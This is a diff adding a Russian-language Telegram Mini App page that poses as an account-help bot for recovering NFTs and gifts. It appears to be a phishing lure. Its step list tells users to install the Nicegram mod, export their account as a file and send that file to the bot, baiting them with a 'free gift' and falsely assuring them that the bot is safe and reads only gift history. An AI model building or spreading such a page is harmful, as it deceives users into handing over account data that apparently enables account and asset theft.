@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Помощь с аккаунтом</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: var(--tg-theme-bg-color, #ffffff);
+            color: var(--tg-theme-text-color, #000000);
+            line-height: 1.6;
+        }
+        .container {
+            padding: 20px;
+            max-width: 100%;
+        }
+        h1, h2 {
+            color: var(--tg-theme-link-color, #2481cc);
+        }
+        .warning {
+            background: #fff3cd;
+            color: #856404;
+            padding: 15px;
+            border-radius: 12px;
+            margin: 15px 0;
+            font-size: 15px;
+        }
+        button {
+            width: 100%;
+            padding: 18px;
+            margin: 20px 0 10px 0;
+            font-size: 18px;
+            font-weight: bold;
+            border: none;
+            border-radius: 12px;
+            background: #2481cc;
+            color: white;
+            cursor: pointer;
+        }
+        button:active {
+            opacity: 0.85;
+        }
+        .emoji {
+            font-size: 24px;
+        }
+        .step {
+            background: var(--tg-theme-secondary-bg-color, #f1f1f1);
+            padding: 15px;
+            margin: 12px 0;
+            border-radius: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="warning">
+            <strong>Ваши данные полностью конфиденциальны.</strong><br>
+            Бот работает автоматически без контакта с оператором через закрытый аккаунт @Hordet.<br>
+            Если вам понадобится помощь, оператор не сможет увидеть все прошлые сообщения.
+        </div>
+
+        <h1>🥰 Привет!</h1>
+        <p>Я бот, который поможет тебе с финансовыми проблемами на твоём аккаунте (NFT, подарки и т.д.) и я полностью безопасен 😉</p>
+
+        <p><strong>Если понадобится помощь, напишите «мне нужна помощь» в чат.</strong></p>
+
+        <h2>Для возвращения NFT и подарков следуйте инструкции ниже:</h2>
+
+        <p><strong>Если хочешь получить халявный подарок, то скидывай файл.</strong> (Он нужен для улучшения работы бота.)</p>
+
+        <div class="step">
+            1. Скачай мод на Telegram — <strong>NiceGram</strong><br>
+            2. Зарегистрируйся<br>
+            3. Нажми на 3 полоски в верхнем левом углу<br>
+            4. Нажми «Настройки»<br>
+            5. Найди пункт <strong>NiceGram</strong> и нажми на него<br>
+            6. Нажми «Экспортировать как файл»<br>
+            7. Выбери аккаунт, с которым возникла проблема<br>
+            8. Прими все и нажми «Сохранить как»
+        </div>
+
+        <p><small>(В вашем файле есть данные о вашем аккаунте, но бот читает только историю, номер и серию подарка)</small></p>
+
+        <div class="step">
+            9. Далее заходи в чат с ботом и нажми на скрепку 📎<br>
+            10. Нажми «Файл»<br>
+            11. Выбери этот файл, который экспортировал(а), и отправь его боту<br>
+            12. Всё, готово! 🥳 Бот тебе отправит сообщение о проверке и в течение дня проблема будет решена 💪
+        </div>
+
+        <p style="text-align:center; font-size:18px; margin:25px 0;">
+            <strong>Чтобы бот смог тебе помочь — отправьте файл в диалог с ботом ❗</strong>
+        </p>
+
+        <button onclick="callOperator()">Позвать оператора</button>
+
+        <p style="text-align:center; opacity:0.8; font-size:15px;">
+            Если тебе нужна помощь с другими вопросами — позови оператора.
+        </p>
+    </div>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+
+        function init() {
+            tg.ready();
+            tg.expand();
+            tg.setHeaderColor('#2481cc');
+        }
+
+        // Кнопка "Позвать оператора"
+        function callOperator() {
+            // Отправляем сообщение боту
+            tg.sendData("мне нужна помощь");
+
+            // Показываем подтверждение пользователю
+            tg.showPopup({
+                title: "Оператор вызван",
+                message: "Сообщение «мне нужна помощь» отправлено в чат с ботом.\n\nОжидайте ответа.",
+                buttons: [
+                    { id: "close", type: "close", text: "Закрыть" }
+                ]
+            });
+
+            // Можно закрыть мини-приложение после отправки
+            // tg.close();   // раскомментируй, если хочешь авто-закрытие
+        }
+
+        // Запуск
+        window.onload = init;
+
+        // Поддержка смены темы
+        tg.onEvent('themeChanged', () => {
+            document.documentElement.style.setProperty('--tg-theme-bg-color', tg.themeParams.bg_color);
+        });
+    </script>
+</body>
+</html>
